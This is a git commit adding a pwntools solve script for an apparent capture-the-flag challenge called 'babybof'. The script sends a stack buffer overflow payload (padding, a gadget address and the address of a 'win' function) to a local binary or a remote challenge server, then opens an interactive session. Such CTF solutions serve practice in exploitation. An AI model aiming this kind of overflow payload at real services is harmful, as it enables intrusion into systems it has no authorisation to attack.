736d17307e26a05abb8f3a463dc92aef7d5e3ba9
Saitomu <dung9126lol@gmail.com>
2026-01-12 15:19:42 +0700

    Add files via upload

---
+++ babybof/solve.py
@@ -0,0 +1,43 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF('chall', checksec=False)
+# libc = ELF('', checksec=False)
+context.binary = exe
+
+info = lambda msg: log.info(msg)
+s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
+sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
+sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
+sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
+sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
+sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
+sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
+slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
+def GDB():
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript='''
+        b*0x401283
+
+        c
+        ''')
+        sleep(1)
+
+
+if args.REMOTE:
+    p = remote('34.48.173.44', 5000)
+else:
+    p = process([exe.path])
+GDB()
+
+load = flat(
+    b'\0' + b'A'*23,
+    0x00000000004012d4,
+    exe.sym.win
+)
+
+
+sla(b'name: ', load)
+
+p.interactive()
